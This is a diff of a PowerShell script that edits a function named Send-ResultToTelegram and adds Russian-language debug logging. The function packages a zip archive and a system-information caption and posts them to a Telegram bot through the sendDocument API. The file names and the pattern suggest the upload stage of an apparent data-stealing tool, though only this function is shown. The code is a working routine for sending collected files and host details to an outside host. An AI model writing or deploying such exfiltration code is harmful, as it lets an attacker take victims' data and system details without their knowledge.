@@ -246,38 +246,58 @@ function Send-ResultToTelegram {
         [string]$ZipPath,
         [string]$SystemInfoPath
     )
+
     $caption = Get-Content $SystemInfoPath | Out-String
     $url = "https://api.telegram.org/bot$BotToken/sendDocument"
-    
+
     try {
         Add-Type -AssemblyName System.Net.Http
-        
-        $client = New-Object System.Net.Http.HttpClient
-        $form = New-Object System.Net.Http.MultipartFormDataContent
 
-        # Добавляем файл
+        Write-Host "DEBUG: Открытие файла архива -> $ZipPath"
         $fileStream = [System.IO.File]::OpenRead($ZipPath)
+        $fileName = [System.IO.Path]::GetFileName($ZipPath)
+        Write-Host "DEBUG: Формирование StreamContent для $fileName"
+
         $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
         $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
-        $form.Add($fileContent, "document", [System.IO.Path]::GetFileName($ZipPath))
 
-        # Добавляем caption и chat_id
+        Write-Host "DEBUG: Формирование MultipartFormDataContent"
+        $form = New-Object System.Net.Http.MultipartFormDataContent
+        $form.Add($fileContent, "document", $fileName)
         $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
         $form.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
 
-        # Отправляем
+        Write-Host "DEBUG: Инициализация клиента и отправка запроса"
+        $client = New-Object System.Net.Http.HttpClient
         $response = $client.PostAsync($url, $form).Result
+
+        $statusCode = $response.StatusCode
+        $reasonPhrase = $response.ReasonPhrase
         $result = $response.Content.ReadAsStringAsync().Result
+
+        # Логируем для диагностики:
+        Write-Host "DEBUG: StatusCode -> $statusCode"
+        Write-Host "DEBUG: ReasonPhrase -> $reasonPhrase"
+        Write-Host "DEBUG: Response -> $result"
+
         $fileStream.Dispose()
         $form.Dispose()
         $client.Dispose()
-        if ($response.StatusCode -eq [System.Net.HttpStatusCode]::OK) { return $true }
-        else { return $false }
+
+        if ($response.StatusCode -eq [System.Net.HttpStatusCode]::OK) { 
+            Write-Host "DEBUG: Файл успешно отправлен!"
+            return $true 
+        } else { 
+            Write-Host "DEBUG: Ошибка при отправке файла."
+            return $false 
+        }
     }
     catch {
+        Write-Host "DEBUG: Exception! " $_.Exception.Message
         return $false
     }
 }
+
 
 
 
